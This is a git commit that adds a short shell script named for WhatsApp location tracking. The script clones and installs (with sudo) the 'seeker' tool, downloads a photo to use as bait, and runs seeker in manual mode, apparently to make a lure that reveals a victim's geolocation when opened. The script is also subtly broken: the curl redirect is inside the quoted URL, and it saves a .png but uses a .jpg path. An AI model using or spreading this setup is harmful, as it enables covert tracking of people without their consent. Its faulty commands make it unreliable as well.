f681e37a5c25ee85b78a0a741efd36a975090273
Bryan Dijkhuizen <dijkhuizenb@outlook.com>
2021-02-07 23:22:30 +0100

    Create whatsapp-loc.sh

---
+++ whatsapp-loc.sh
@@ -0,0 +1,18 @@
+git clone https://github.com/thewhiteh4t/seeker
+
+cd seeker && ls
+
+sudo bash install.sh
+
+cd Pictures
+
+curl "https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixid=MXwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHw%3D&ixlib=rb-1.2.1&auto=format&fit=crop&w=1327&q=80 > image.png"
+
+cd ..
+
+python3 seeker.py -t manual
+
+2
+
+/home/kali/Pictures/image.jpg
+
